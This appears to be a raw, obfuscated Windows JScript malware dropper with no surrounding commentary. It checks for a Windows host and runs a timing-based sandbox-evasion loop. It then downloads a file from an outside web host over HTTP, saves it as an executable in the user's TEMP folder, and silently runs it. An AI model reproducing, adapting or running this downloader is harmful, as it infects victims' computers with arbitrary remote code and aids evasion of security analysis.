var X = false;
var U = "CreateObject";
var SH = function UC() {return WScript[U]("WScript.Shell");}(), FH = 11;
var t = "MSXML2.XMLHTTP";
var j = 2123213;
var dN = 0;
function wr(D){SH["Run"](D, dN, dN);};
function h(){return "" + t;};
function Ak(Y, L){dN = dN * 1; return Y - L;};
function g(){return U;};
/*@cc_on
  @if (@_win32 || @_win64)
    X = true;
  @end
@*/
if (X)
{
var N = "";
function gA(){return 22;};
var KS = 0; var iM = 0;
function hM()
{
var gk = new this["Date"]();
var O = gk["getUTCMilliseconds"]();
WScript["Sleep"](gA());
var gk = new this["Date"]();
var AW = gk["getUTCMilliseconds"]();
WScript["Sleep"](gA());
var gk = new this["Date"]();
var h0 = gk["getUTCMilliseconds"]();
var KS = "eQ";
KS = Ak(AW, O);
var iM = "G";
iM = Ak(h0, AW);
N = "open";
return Ak(KS, iM);
}
var yK = false;
var CD = false;
for (var FZ = dN; FZ < gA() * 1; FZ++){if (hM() != dN){
yK = true; 
iM = "31" + 11 * KS + iM; 
CD = true; 
break;
}}
function e() {return ((yK == true) && (yK == CD)) ? 1 : dN;};
if (yK && e() && CD){
function bn() {return SH["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5W3HEXQXtz8Hu.exe";};
 uR = h();
 Nn = WScript[U](uR);
 var P = 1;
 while (P){
try {
Nn[N]("GET", "http://caferacerpneus.com.br/lw2osd", false);
Nn["send"]();
Z = "Sleep";
for (;;){WScript[Z](gA() * 11); if (Nn["readystate"] >= 2 * 2) break;};
P = dN;
} catch(H){};
}
function gP(sG) {var W = (1, 2, 3, 4, 5, sG); return W;};
yj = WScript[g()]("ADODB.Stream");
uR = yj;
uR[N]();
uR["type"] = gP(1);
uR["write"](Nn["ResponseBody"]);
yj["position"] = gP(dN);
uR["Save" + "ToFile"](bn(), 2);
yj["c"+"lose"]();
q = bn();
wr(q);
}
}

